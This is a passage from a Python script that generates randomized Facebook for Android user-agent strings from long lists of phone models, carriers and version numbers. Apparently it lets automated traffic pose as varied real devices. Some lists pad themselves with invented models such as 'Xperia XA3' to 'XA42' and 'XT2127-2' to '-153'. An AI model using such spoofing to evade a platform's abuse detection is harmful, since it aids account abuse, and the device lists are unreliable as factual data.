            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2012K11C',
            'Redmi 6A',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp;amp-T',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi 4X',
            'Redmi Note 8',
            'Redmi Note 8 Pro',
            'Xiaomi Mi 11 Ultra',
            'Xiaomi Mi 11 Pro',
            'Xiaomi Mi 11',
            'Xiaomi Mi 10 Ultra',
            'Xiaomi Mi 10 Pro',
            'Xiaomi Mi 10',
            'Xiaomi Mi 10T Pro',
            'Xiaomi Mi 10T',
            'Xiaomi Mi 9T Pro',
            'Xiaomi Mi 9T',
            'Xiaomi Mi 9 Pro 5G',
            'Xiaomi Mi 9',
            'Xiaomi Mi 8 Pro',
            'Xiaomi Mi 8',
            'Xiaomi Mi 8 Lite',
            'Xiaomi Mi 8 SE',
            'Xiaomi Mi Mix 3',
            'Xiaomi Mi Mix 2S',
            'Xiaomi Mi Mix 2',
            'Xiaomi Mi Mix',
            'Xiaomi Redmi Note 11 Pro+',
            'Xiaomi Redmi Note 11 Pro',
            'Xiaomi Redmi Note 11',
            'Xiaomi Redmi Note 10 Pro',
            'Xiaomi Redmi Note 10',
            'Xiaomi Redmi Note 9 Pro',
            'Xiaomi Redmi Note 9',
            'Xiaomi Redmi Note 8 Pro',
            'Xiaomi Redmi Note 8',
            'Xiaomi Redmi Note 7 Pro',
            'Xiaomi Redmi Note 7',
            'Xiaomi Redmi K40 Pro',
            'Xiaomi Redmi K40',
            'Xiaomi Redmi K30 Pro',
            'Xiaomi Redmi K30',
            'Xiaomi Redmi K20 Pro',
            'Xiaomi Redmi K20',
            'Xiaomi Poco X3 Pro',
            'Xiaomi Poco X3',
            'Xiaomi Poco X2',
            'Xiaomi Poco F3',
            'Xiaomi Poco F2 Pro',
            'Xiaomi Poco F1'])
    if a7 == 'samsung':
        a11 = random.choice([
            'SM-A500F',
            'SM-A500FU',
            'SM-A500H',
            'SM-G532F',
            'SM-G900F',
            'SM-G920F',
            'SM-G930F',
            'SM-G935F',
            'SM-G950F',
            'SM-J320F',
            'SM-J320FN',
            'SM-J320H',
            'SM-J320M',
            'SM-J510FN',
            'SM-J701F',
            'SM-N920S',
            'SM-T111',
            'SM-T230',
            'SM-T231',
            'SM-T235',
            'SM-T280',
            'SM-T311',
            'SM-T315',
            'SM-T525',
            'SM-T531',
            'SM-T535',
            'SM-T555',
            'SM-T561',
            'SM-T705',
            'SM-T805',
            'SM-T820',
            'SPH-L720',
            'SM-S906E',
            'SM-G991',
            'SM-G981',
            'SM-G973',
            'SM-G960',
            'SM-G950',
            'SM-G930',
            'SM-G920',
            'SM-G900',
            'GT-I9500',
            'GT-I9300',
            'GT-I9100',
            'GT-I9000',
            'SM-N981',
            'SM-N970',
            'SM-N960',
            'SM-N950',
            'SM-N920',
            'SM-N910',
            'SM-N900',
            'GT-N7100',
            'GT-N7000',
            'SM-G991',
            'SM-G981',
            'SM-G973',
            'SM-G960',
            'SM-G950',
            'SM-G930',
            'SM-G920',
            'SM-G900',
            'GT-I9500',
            'GT-I9300',
            'GT-I9100',
            'GT-I9000',
            'SM-N981',
            'SM-N970',
            'SM-N960',
            'SM-N950',
            'SM-N920',
            'SM-N910',
            'SM-N900',
            'GT-N7100',
            'GT-N7000',
            'SM-A526B',
            'SM-A516B',
            'SM-A516N',
            'SM-A526U',
            'SM-A716U',
            'SM-A716V',
            'SM-A5260',
            'SM-A526W',
            'SM-A126U',
            'SM-A126V',
            'SM-A016G',
            'SM-A016B',
            'SM-A016M',
            'SM-A025M',
            'SM-A025F',
            'SM-A217F',
            'SM-A217M',
            'SM-A207F',
            'SM-A207M',
            'SM-A102U',
            'SM-A102U1',
            'SM-A102W',
            'SM-A102N',
            'SM-A1020',
            'SM-A105F',
            'SM-A105G',
            'SM-A105M',
            'SM-A202F',
            'SM-A202G',
            'SM-A202M',
            'SM-A125U',
            'SM-A125V',
            'SM-A022G',
            'SM-A022M',
            'SM-A027G',
            'SM-A027M',
            'SM-A2170',
            'SM-A115M',
            'SM-A107M',
            'SM-A107F',
            'SM-A107M',
            'SM-A0220',
            'SM-A115F',
            'SM-A102F',
            'SM-A1050'])
    if a7 == 'infinix':
        a11 = random.choice([
            'Infinix X608',
            'Infinix X606B',
            'Infinix X559C',
            'Infinix Zero 3',
            'Infinix X5515F',
            'Infinix Hot 4 Pro',
            'Infinix X510',
            'X676B',
            'X687',
            'X609',
            'X697',
            'X680D',
            'X507',
            'X605',
            'X668',
            'X6815B',
            'X624',
            'X655F',
            'X689C',
            'X608',
            'X698',
            'X682B',
            'X682C',
            'X688C',
            'X688B',
            'X658E',
            'X659B',
            'X689B',
            'X689',
            'X689D',
            'X662',
            'X662B',
            'X675',
            'X6812B',
            'X6812',
            'X6817B',
            'X6817',
            'X6816C',
            'X6816',
            'X6816D',
            'X668C',
            'X665B',
            'X665E',
            'X510',
            'X559C',
            'X559F',
            'X559',
            'X606',
            'X606C',
            'X606D',
            'X623',
            'X624B',
            'X625C',
            'X625D',
            'X625B',
            'X650D',
            'X650B',
            'X650',
            'X650C',
            'X655C',
            'X655D',
            'X680B',
            'X573',
            'X573B',
            'X622',
            'X693',
            'X695C',
            'X695D',
            'X695',
            'X663B',
            'X663',
            'X670',
            'X671',
            'X671B',
            'X672',
            'X6819',
            'X572',
            'X572-LTE',
            'X571',
            'X604',
            'X610B',
            'X690',
            'X690B',
            'X656',
            'X692',
            'X683',
            'X450',
            'X5010',
            'X501',
            'X401',
            'X626',
            'X626B',
            'X652',
            'X652A',
            'X652B',
            'X652C',
            'X660B',
            'X660C',
            'X660',
            'X5515',
            'X5515F',
            'X5515I',
            'X609B',
            'X5514D',
            'X5516B',
            'X5516C',
            'X627',
            'X680',
            'X653',
            'X653C',
            'X657',
            'X657B',
            'X657C',
            'X6511B',
            'X6511E',
            'X6511',
            'X6512',
            'X6823C',
            'X612B',
            'X612',
            'X503',
            'X511',
            'X352',
            'X351',
            'X530',
            'X676C',
            'X6821',
            'X6823',
            'X6827',
            'X509',
            'X603',
            'X6815',
            'X620B',
            'X620',
            'X687B',
            'X6811B',
            'X6810',
            'X6811'])
    a8 = ';FBBD/'
    a9 = a7
    a10 = ';FBDV/'
    a12 = ';FBSV/' + str(random.randint(9, 12)) + ';FBCA/arm64-v8a:null;FBDM/{density=' + str(random.randint(2, 3)) + '.' + str(random.randint(0, 5)) + ',width=720,height=' + str(random.randint(1400, 1499)) + '};FB_FW/1;]'
    katana1 = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';'
    katana2 = '[FBAN/FB4A;FBAV/' + str(random.randint(199, 399)) + '.0.0.' + str(random.randint(1, 9)) + '.' + str(random.randint(99, 199)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBDM/{density=' + str(random.randint(2, 3)) + '.' + str(random.randint(0, 5)) + ',width=1080,height=' + str(random.randint(1400, 1499)) + '};FBLC/'
    katana3 = 'en_US'
    katana4 = ';FBRV/' + str(random.randint(199, 399)) + '.0.0.' + str(random.randint(1, 9)) + '.' + str(random.randint(99, 199)) + ';FBCR/'
    katana5 = random.choice([
        'GLOBE',
        'TNT',
        'SMART',
        'DITO',
        'TM',
        'Verizon'])
    katana6 = ';FBMF/'
    katana7 = random.choice([
        'samsung',
        'infinix',
        'xiaomi',
        'vivo',
        'oppo',
        'motorola',
        'realme',
        'sony',
        'tecno',
        'itel',
        'meizu',
        'asus'])
    if katana7 == 'asus':
        katana11 = random.choice([
            'ZenFone 8',
            'ROG Phone 5',
            'ZenFone 7',
            'ROG Phone 3',
            'ZenFone 6',
            'ROG Phone II',
            'ZenFone 5Z',
            'ZenFone 5',
            'ZenFone 4 Pro',
            'ZenFone 4',
            'ZenFone 3 Deluxe',
            'ZenFone 3',
            'ZenFone 2 Laser',
            'ZenFone 2',
            'ZenFone',
            'ZenFone 6Z',
            'ZenFone Max Pro (M2)',
            'ZenFone Max Pro (M1)',
            'ZenFone 6Z',
            'ZenFone Max Plus (M2)',
            'ZenFone Max (M2)',
            'ZenFone Max (M1)',
            'ZenFone Live',
            'ZenFone Zoom',
            'ZenFone Selfie',
            'ASUS_Z01RD',
            'ASUS_Z01QD',
            'ASUS_I01WD',
            'ASUS_I01BD',
            'ASUS_I01HDA'])
    if katana7 == 'meizu':
        katana11 = random.choice([
            'Meizu 18s',
            'Meizu 18',
            'Meizu 17 Pro',
            'Meizu 17',
            'Meizu 16s Pro',
            'Meizu 16s',
            'Meizu 16T',
            'Meizu 16Xs',
            'Meizu 16X',
            'Meizu 16th Plus',
            'Meizu 16th',
            'Meizu 15 Plus',
            'Meizu 15',
            'Meizu 15 Lite',
            'Meizu 16s Plus',
            'Meizu 16',
            'Meizu 16 Max',
            'Meizu 16 Note',
            'Meizu 16s Plus',
            'Meizu 16',
            'Meizu 16X',
            'Meizu 16th Plus',
            'Meizu 16th',
            'Meizu 15 Plus',
            'Meizu 15',
            'Meizu 15 Lite',
            'Meizu M6T',
            'Meizu M6s',
            'Meizu M6 Note',
            'Meizu M6',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5'])
    if katana7 == 'itel':
        katana11 = random.choice([
            'S41',
            'S31',
            'S21',
            'S12',
            'S11',
            'A56',
            'A55',
            'A54',
            'A23',
            'A16',
            'A15',
            'P36 Pro',
            'P36',
            'P33 Plus',
            'P33',
            'P32',
            'P31',
            'A88',
            'A47',
            'A46',
            'A45',
            'A44',
            'A41 Plus',
            'A41',
            'A25 Pro',
            'A25',
            'A23 Pro',
            'A22 Pro',
            'A22',
            'A21',
            'A16 Plus',
            'A16S',
            'A16',
            'A14',
            'A13 Plus',
            'A13',
            'A11',
            'A10',
            'Vision 1 Plus',
            'Vision 1',
            'S13 Pro',
            'S13',
            'S12 Lite',
            'S11 Lite',
            'S11 Pro',
            'S11 Plus',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10'])
    if katana7 == 'tecno':
        katana11 = random.choice([
            'Camon 16 Premier',
            'Camon 16 Pro',
            'Camon 16',
            'Camon 15 Premier',
            'Camon 15 Pro',
            'Camon 15',
            'Spark 6',
            'Spark 5 Pro',
            'Spark 5',
            'Pova',
            'Pouvoir 4 Pro',
            'Pouvoir 4',
            'Phantom 9',
            'Phantom X',
            'Camon 12 Pro',
            'Camon 12',
            'Camon 11',
            'Camon 11 Pro',
            'Camon 11S',
            'Spark 4',
            'Spark 4 Air',
            'Spark 3 Pro',
            'Spark 3',
            'Spark 2',
            'Pouvoir 3 Plus',
            'Pouvoir 3',
            'Phantom 8',
            'Phantom 6',
            'Phantom 6 Plus',
            'Camon X Pro',
            'Camon X',
            'Camon CM',
            'Camon CX Air',
            'Camon CX',
            'Spark Plus K9',
            'Spark K7',
            'Spark Plus K9',
            'Spark K7 Plus',
            'Boom J8',
            'Boom J7',
            'Boom J5',
            'Boom J9 Plus',
            'Boom J10',
            'Pop 3',
            'Pop 2 Plus',
            'Pop 2 Power',
            'Pop 2F',
            'Pop 1',
            'F1',
            'F2',
            'F3',
            'F4',
            'F5'])
    if katana7 == 'sony':
        katana11 = random.choice([
            'Xperia 1',
            'Xperia 5',
            'Xperia 10',
            'Xperia L4',
            'Xperia XZ3',
            'Xperia XZ2',
            'Xperia XZ1',
            'Xperia XA2',
            'Xperia XA1',
            'Xperia XZs',
            'Xperia XZ',
            'Xperia X Compact',
            'Xperia XA Ultra',
            'Xperia XA',
            'Xperia X Performance',
            'Xperia XA1 Ultra',
            'Xperia XA2 Ultra',
            'Xperia XZ2 Premium',
            'Xperia XZ2 Compact',
            'Xperia 10 Plus',
            'Xperia L3',
            'Xperia 1 II',
            'Xperia 5 II',
            'Xperia 10 II',
            'Xperia 10 III',
            'Xperia L5',
            'Xperia XZ4',
            'Xperia XZ4 Compact',
            'Xperia XZ Premium',
            'Xperia XZ1 Compact',
            'Xperia XA3',
            'Xperia XA4',
            'Xperia XA5',
            'Xperia XA6',
            'Xperia XA7',
            'Xperia XA8',
            'Xperia XA9',
            'Xperia XA10',
            'Xperia XA11',
            'Xperia XA12',
            'Xperia XA13',
            'Xperia XA14',
            'Xperia XA15',
            'Xperia XA16',
            'Xperia XA17',
            'Xperia XA18',
            'Xperia XA19',
            'Xperia XA20',
            'Xperia XA21',
            'Xperia XA22',
            'Xperia XA23',
            'Xperia XA24',
            'Xperia XA25',
            'Xperia XA26',
            'Xperia XA27',
            'Xperia XA28',
            'Xperia XA29',
            'Xperia XA30',
            'Xperia XA31',
            'Xperia XA32',
            'Xperia XA33',
            'Xperia XA34',
            'Xperia XA35',
            'Xperia XA36',
            'Xperia XA37',
            'Xperia XA38',
            'Xperia XA39',
            'Xperia XA40',
            'Xperia XA41',
            'Xperia XA42'])
    if katana7 == 'realme':
        katana11 = random.choice([
            'RMX3516',
            'RMX3371',
            'RMX3461',
            'RMX3286',
            'RMX3561',
            'RMX3388',
            'RMX3311',
            'RMX3142',
            'RMX2071',
            'RMX1805',
            'RMX1809',
            'RMX1801',
            'RMX1807',
            'RMX1803',
            'RMX1825',
            'RMX1821',
            'RMX1822',
            'RMX1833',
            'RMX1851',
            'RMX1853',
            'RMX1827',
            'RMX1911',
            'RMX1919',
            'RMX1927',
            'RMX1971',
            'RMX1973',
            'RMX2030',
            'RMX2032',
            'RMX1925',
            'RMX1929',
            'RMX2001',
            'RMX2061',
            'RMX2063',
            'RMX2040',
            'RMX2042',
            'RMX2002',
            'RMX2151',
            'RMX2163',
            'RMX2155',
            'RMX2170',
            'RMX2103',
            'RMX3085',
            'RMX3241',
            'RMX3081',
            'RMX3151',
            'RMX3381',
            'RMX3521',
            'RMX3474',
            'RMX3471',
            'RMX3472',
            'RMX3392',
            'RMX3393',
            'RMX3491',
            'RMX1811',
            'RMX2185',
            'RMX3231',
            'RMX2189',
            'RMX2180',
            'RMX2195',
            'RMX2101',
            'RMX1941',
            'RMX1945',
            'RMX3063',
            'RMX3061',
            'RMX3201',
            'RMX3203',
            'RMX3261',
            'RMX3263',
            'RMX3193',
            'RMX3191',
            'RMX3195',
            'RMX3197',
            'RMX3265',
            'RMX3268',
            'RMX3269',
            'RMX2027',
            'RMX2020',
            'RMX2021',
            'RMX3581',
            'RMX3501',
            'RMX3503',
            'RMX3511',
            'RMX3310',
            'RMX3312',
            'RMX3551',
            'RMX3301',
            'RMX3300',
            'RMX2202',
            'RMX3363',
            'RMX3360',
            'RMX3366',
            'RMX3361',
            'RMX3031',
            'RMX3370',
            'RMX3357',
            'RMX3560',
            'RMX3562',
            'RMX3350',
            'RMX2193',
            'RMX2161',
            'RMX2050',
            'RMX2156',
            'RMX3242',
            'RMX3171',
            'RMX3430',
            'RMX3235',
            'RMX3506',
            'RMX2117',
            'RMX2173',
            'RMX3161',
            'RMX2205',
            'RMX3462',
            'RMX3478',
            'RMX3372',
            'RMX3574',
            'RMX1831',
            'RMX3121',
            'RMX3122',
            'RMX3125',
            'RMX3043',
            'RMX3042',
            'RMX3041',
            'RMX3092',
            'RMX3093',
            'RMX3571',
            'RMX3475',
            'RMX2200',
            'RMX2201',
            'RMX2111',
            'RMX2112',
            'RMX1901',
            'RMX1903',
            'RMX1992',
            'RMX1993',
            'RMX1991',
            'RMX1931',
            'RMX2142',
            'RMX2081',
            'RMX2085',
            'RMX2083',
            'RMX2086',
            'RMX2144',
            'RMX2051',
            'RMX2025',
            'RMX2075',
            'RMX2076',
            'RMX2072',
            'RMX2052',
            'RMX2176',
            'RMX2121',
            'RMX3115',
            'RMX1921'])
    if katana7 == 'motorola':
        katana11 = random.choice([
            'Moto G100',
            'Moto G60',
            'Moto G40 Fusion',
            'Moto G30',
            'Moto G9 Power',
            'Moto G8',
            'Moto G Power 2022',
            'Moto G7',
            'Moto G Stylus 2022',
            'Motorola Edge 20 Pro',
            'Motorola Edge 20',
            'Motorola Edge 20 Lite',
            'Motorola Moto G Stylus (2021)',
            'Motorola Moto G Power (2021)',
            'Motorola Moto G Play (2021)',
            'Motorola Moto G9 Plus',
            'Motorola Moto G9',
            'Motorola Moto G8 Plus',
            'Motorola Moto G8 Power',
            'Motorola Moto G8',
            'Motorola Moto G7 Plus',
            'Motorola Moto G7 Power',
            'Motorola Moto G7 Play',
            'Motorola Moto G7',
            'Motorola Moto G6 Plus',
            'Motorola Moto G6',
            'Motorola Moto G5S Plus',
            'Motorola Moto G5 Plus',
            'Motorola Moto G5',
            'Motorola Moto G4 Plus',
            'Motorola Moto G4',
            'Motorola Moto X4',
            'Motorola Moto X (2nd Gen)',
            'Motorola Moto X',
            'Motorola Moto Z3 Play',
            'Motorola Moto Z2 Play',
            'Motorola Moto Z',
            'Motorola Moto E7 Plus',
            'Motorola Moto E6 Plus',
            'Motorola Moto E5 Plus',
            'Motorola Moto E4 Plus',
            'Motorola Moto E (2nd Gen)',
            'Motorola Moto E',
            'XT2127-2',
            'XT2127-4',
            'XT2127-5',
            'XT2127-6',
            'XT2127-7',
            'XT2127-8',
            'XT2127-10',
            'XT2127-11',
            'XT2127-12',
            'XT2127-13',
            'XT2127-14',
            'XT2127-15',
            'XT2127-16',
            'XT2127-17',
            'XT2127-18',
            'XT2127-19',
            'XT2127-20',
            'XT2127-21',
            'XT2127-22',
            'XT2127-23',
            'XT2127-24',
            'XT2127-25',
            'XT2127-26',
            'XT2127-27',
            'XT2127-28',
            'XT2127-29',
            'XT2127-30',
            'XT2127-31',
            'XT2127-32',
            'XT2127-33',
            'XT2127-34',
            'XT2127-35',
            'XT2127-36',
            'XT2127-37',
            'XT2127-38',
            'XT2127-39',
            'XT2127-40',
            'XT2127-41',
            'XT2127-42',
            'XT2127-43',
            'XT2127-44',
            'XT2127-45',
            'XT2127-46',
            'XT2127-47',
            'XT2127-48',
            'XT2127-49',
            'XT2127-50',
            'XT2127-51',
            'XT2127-52',
            'XT2127-53',
            'XT2127-54',
            'XT2127-55',
            'XT2127-56',
            'XT2127-57',
            'XT2127-58',
            'XT2127-59',
            'XT2127-60',
            'XT2127-61',
            'XT2127-62',
            'XT2127-63',
            'XT2127-64',
            'XT2127-65',
            'XT2127-66',
            'XT2127-67',
            'XT2127-68',
            'XT2127-69',
            'XT2127-70',
            'XT2127-71',
            'XT2127-72',
            'XT2127-73',
            'XT2127-74',
            'XT2127-75',
            'XT2127-76',
            'XT2127-77',
            'XT2127-78',
            'XT2127-79',
            'XT2127-80',
            'XT2127-81',
            'XT2127-82',
            'XT2127-83',
            'XT2127-84',
            'XT2127-85',
            'XT2127-86',
            'XT2127-87',
            'XT2127-88',
            'XT2127-89',
            'XT2127-90',
            'XT2127-91',
            'XT2127-92',
            'XT2127-93',
            'XT2127-94',
            'XT2127-95',
            'XT2127-96',
            'XT2127-97',
            'XT2127-98',
            'XT2127-99',
            'XT2127-100',
            'XT2127-101',
            'XT2127-102',
            'XT2127-103',
            'XT2127-104',
            'XT2127-105',
            'XT2127-106',
            'XT2127-107',
            'XT2127-108',
            'XT2127-109',
            'XT2127-110',
            'XT2127-111',
            'XT2127-112',
            'XT2127-113',
            'XT2127-114',
            'XT2127-115',
            'XT2127-116',
            'XT2127-117',
            'XT2127-118',
            'XT2127-119',
            'XT2127-120',
            'XT2127-121',
            'XT2127-122',
            'XT2127-123',
            'XT2127-124',
            'XT2127-125',
            'XT2127-126',
            'XT2127-127',
            'XT2127-128',
            'XT2127-129',
            'XT2127-130',
            'XT2127-131',
            'XT2127-132',
            'XT2127-133',
            'XT2127-134',
            'XT2127-135',
            'XT2127-136',
            'XT2127-137',
            'XT2127-138',
            'XT2127-139',
            'XT2127-140',
            'XT2127-141',
            'XT2127-142',
            'XT2127-143',
            'XT2127-144',
            'XT2127-145',
            'XT2127-146',
            'XT2127-147',
            'XT2127-148',
            'XT2127-149',
            'XT2127-150',
            'XT2127-151',
            'XT2127-152',
            'XT2127-153'])
    if katana7 == 'oppo':
        katana11 = random.choice([
            'Reno 7 Pro',
            'Reno 7',
            'Reno 6 Pro+',
            'A95',
            'A96',
            'A93',
            'Oppo Find X3 Pro',
            'Oppo Find X2 Pro',
            'Oppo Find X2',
            'Oppo Reno 6 Pro+',
            'Oppo Reno 6 Pro',
            'Oppo Reno 6',
            'Oppo Reno 5 Pro+',
            'Oppo Reno 5 Pro',
            'Oppo Reno 5',
            'Oppo A94',
            'Oppo A74',
            'Oppo F19 Pro+',
            'Oppo F19 Pro',
            'Oppo F19',
            'Oppo A93',
            'Oppo A53',
            'Oppo A33',
            'Oppo A32',
            'Oppo A72',
            'Oppo A52',
            'Oppo A92',
            'Oppo A12',
            'Oppo Reno 3 Pro',
            'Oppo Reno 3',
            'Oppo Reno 2',
            'Oppo Reno',
            'Oppo K7x',
            'Oppo K7',
            'Oppo A9 (2020)',
            'Oppo A5 (2020)',
            'CPH1903',
            'CPH1803',
            'CPH1859',
            'CPH1969',
            'CPH1989',
            'CPH1919',
            'CPH1941',
            'CPH1983',
            'CPH1963',
            'CPH1879',
            'CPH1831',
            'CPH2035',
            'CPH2069',
            'CPH1987',
            'CPH2071',
            'CPH2083',
            'CPH2015',
            'CPH2019',
            'CPH2173',
            'CPH2089',
            'CPH2067',
            'CPH2017',
            'CPH2087',
            'CPH2205',
            'CPH2251',
            'CPH2197',
            'CPH2235',
            'CPH2347',
            'CPH2295',
            'CPH2249',
            'CPH2243',
            'CPH2349',
            'CPH2359',
            'CPH2383',
            'CPH2381',
            'CPH2239',
            'CPH2213',
            'CPH2129',
            'CPH2195',
            'CPH2227',
            'CPH2316',
            'CPH2353',
            'CPH2261',
            'CPH2225',
            'CPH2269',
            'CPH2073',
            'CPH2185',
            'CPH1877',
            'CPH2013',
            'CPH2061',
            'CPH1955',
            'CPH1871',
            'CPH1801',
            'CPH1873',
            'CPH1901',
            'CPH1809',
            'CPH1853',
            'CPH1923',
            'CPH1981',
            'CPH1833',
            'CPH1917',
            'CPH1967',
            'CPH1937',
            'CPH1893',
            'CPH1931',
            'CPH1921',
            'CPH1823',
            'CPH2023',
            'CPH2021',
            'CPH2103',
            'CPH2220',
            'CPH2127',
            'CPH2059',
            'CPH2139',
            'CPH2253',
            'CPH2267',
            'CPH2263',
            'CPH2247',
            'CPH2241',
            'CPH2297',
            'CPH2357',
            'CPH2255',
            'CPH2345',
            'CPH2329',
            'CPH2209',
            'CPH2191',
            'CPH2199',
            'CPH2289',
            'CPH2319',
            'CPH2343',
            'CPH2363',
            'CPH2161',
            'CPH2163',
            'CPH1979',
            'CPH1977',
            'CPH1973',
            'CPH1965',
            'CPH1959',
            'CPH1951',
            'CPH1913',
            'CPH1909',
            'CPH1905',
            'CPH1861',
            'CPH1863',
            'CPH1967',
            'CPH1933',
            'CPH1937',
            'CPH1921',
            'CPH1923',
            'CPH1987',
            'CPH1919',
            'CPH1897',
            'CPH1875',
            'CPH1874',
            'CPH1872',
            'CPH1865',
            'CPH1863',
            'CPH1862',
            'CPH1853',
            'CPH1852',
            'CPH1851',
            'CPH1843',
            'CPH1841',
            'CPH1835',
            'CPH1833',
            'CPH1832',
            'CPH1831',
            'CPH1825',
            'CPH1823',
            'CPH1821',
            'CPH1819',
            'CPH1813',
            'CPH1812',
            'CPH1811',
            'CPH1809',
            'CPH1808',
            'CPH1807',
            'CPH1805',
            'CPH1803',
            'CPH1801'])
    if katana7 == 'vivo':
        katana11 = random.choice([
            'Vivo_X60_Pro',
            'Vivo_X50_Pro',
            'Vivo_X30_Pro',
            'Vivo_X27',
            'Vivo_X23',
            'Vivo_X21',
            'Vivo_V21',
            'Vivo_V17',
            'Vivo_V15',
            'Vivo_V11',
            'Vivo_V9',
            'Vivo_Y95',
            'Vivo_Y91',
            'Vivo_Y81',
            'Vivo_Y71',
            'Vivo_S1',
            'V2056',
            'V2112A',
            'V2112',
            'V2122A',
            'V2120A',
            'V2120',
            'V2116A',
            'V2114A',
            'V2112A',
            'V2010A',
            'V2019A',
            'V2010',
            'V2003A',
            'V2002A',
            'V2002',
            'V1932A',
            'V1932T',
            'V1932',
            'V1929A',
            'V1928A',
            'V1928T',
            'V1928',
            'V1927A',
            'V1926A',
            'V1925A',
            'V1925',
            'V1924A',
            'V1922A',
            'V1921A',
            'V1921',
            'V1920A',
            'V1919A',
            'V1916A',
            'V1916',
            'V1912A',
            'V1911A',
            'V1910A',
            'V1910',
            'V1909A',
            'V1907A',
            'V1905',
            'V1903A',
            'V1901A',
            'V1901T',
            'V1901',
            'V1836',
            'V1824A',
            'V1824T',
            'V1824',
            'V1818A',
            'V1818T',
            'V1813A',
            'V1813T',
            'V1813',
            'V1812A',
            'V1811A',
            'V1811T',
            'V1811',
            'V1808A',
            'V1808T',
            'V1808',
            'V1801A',
            'V1801T',
            'V1801',
            'V1730T',
            'V1730F',
            'V1730A',
            'V1730',
            'V1724A',
            'V1723A',
            'V1723',
            'V1721A',
            'V1720A',
            'V1720T',
            'V1720',
            'V1716A',
            'V1715A',
            'V1715',
            'V1713A',
            'V1713',
            'V1712A',
            'V1712',
            'V1711T',
            'V1711A',
            'V1711',
            'V1709A',
            'V1709T',
            'V1709',
            'V1708A',
            'V1708T',
            'V1707A',
            'V1707T',
            'V1706T',
            'V1706',
            'V1703A',
            'V1701A',
            'V1701',
            'V1624A',
            'V1623A',
            'V1622A',
            'V1622',
            'V1621A',
            'V1619',
            'V1618A',
            'V1617A',
            'V1616',
            'V1615T',
            'V1614T',
            'V1613',
            'V1611T',
            'V1611',
            'V1608A',
            'V1609',
            'V1605',
            'V1604',
            'V1603',
            'V1601',
            'V1570',
            'V1562',
            'V1561',
            'V1550',
            'V1548',
            'V1546',
            'V1543',
            'V1542',
            'V1540',
            'V1530',
            'V1520',
            'V1510',
            'V1500',
            'V1420',
            'V1400',
            'V1310',
            'V1320'])
    if katana7 == 'xiaomi':
        katana11 = random.choice([
            'Mi 11',
            'Mi 10 Pro',
            'Mi 9T',
            'M2101K7AG',
            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2012K11C',
            'Redmi 6A',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp;amp-T',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi 4X',
            'Redmi Note 8',
            'Redmi Note 8 Pro',
            'Xiaomi Mi 11 Ultra',
            'Xiaomi Mi 11 Pro',
            'Xiaomi Mi 11',
            'Xiaomi Mi 10 Ultra',
            'Xiaomi Mi 10 Pro',
            'Xiaomi Mi 10',
            'Xiaomi Mi 10T Pro',
            'Xiaomi Mi 10T',
            'Xiaomi Mi 9T Pro',
            'Xiaomi Mi 9T',
            'Xiaomi Mi 9 Pro 5G',
            'Xiaomi Mi 9',
            'Xiaomi Mi 8 Pro',
            'Xiaomi Mi 8',
            'Xiaomi Mi 8 Lite',
            'Xiaomi Mi 8 SE',
            'Xiaomi Mi Mix 3',
            'Xiaomi Mi Mix 2S',
            'Xiaomi Mi Mix 2',
            'Xiaomi Mi Mix',
            'Xiaomi Redmi Note 11 Pro+',
            'Xiaomi Redmi Note 11 Pro',
            'Xiaomi Redmi Note 11',
            'Xiaomi Redmi Note 10 Pro',
            'Xiaomi Redmi Note 10',
            'Xiaomi Redmi Note 9 Pro',
            'Xiaomi Redmi Note 9',
            'Xiaomi Redmi Note 8 Pro',
            'Xiaomi Redmi Note 8',
            'Xiaomi Redmi Note 7 Pro',
            'Xiaomi Redmi Note 7',
            'Xiaomi Redmi K40 Pro',
            'Xiaomi Redmi K40',
            'Xiaomi Redmi K30 Pro',
            'Xiaomi Redmi K30',
            'Xiaomi Redmi K20 Pro',
            'Xiaomi Redmi K20',
            'Xiaomi Poco X3 Pro',
            'Xiaomi Poco X3',
            'Xiaomi Poco X2',
            'Xiaomi Poco F3',
            'Xiaomi Poco F2 Pro',
            'Xiaomi Poco F1'])
    if katana7 == 'samsung':
        katana11 = random.choice([
            'SM-A500F',
            'SM-A500FU',
            'SM-A500H',
            'SM-G532F',
            'SM-G900F',
            'SM-G920F',
            'SM-G930F',
            'SM-G935F',
            'SM-G950F',
            'SM-J320F',
            'SM-J320FN',
            'SM-J320H',
            'SM-J320M',
            'SM-J510FN',
            'SM-J701F',
            'SM-N920S',
            'SM-T111',
            'SM-T230',
            'SM-T231',
            'SM-T235',
            'SM-T280',
            'SM-T311',
            'SM-T315',
            'SM-T525',
            'SM-T531',
            'SM-T535',
            'SM-T555',
            'SM-T561',
            'SM-T705',
            'SM-T805',
            'SM-T820',
            'SPH-L720',
            'SM-S906E',
            'SM-G991',
            'SM-G981',
            'SM-G973',
            'SM-G960',
            'SM-G950',
            'SM-G930',
            'SM-G920',
            'SM-G900',
            'GT-I9500',
            'GT-I9300',
            'GT-I9100',
            'GT-I9000',
            'SM-N981',
            'SM-N970',
            'SM-N960',
            'SM-N950',
            'SM-N920',
            'SM-N910',
            'SM-N900',
            'GT-N7100',
            'GT-N7000',
            'SM-G991',
            'SM-G981',
            'SM-G973',
            'SM-G960',
            'SM-G950',
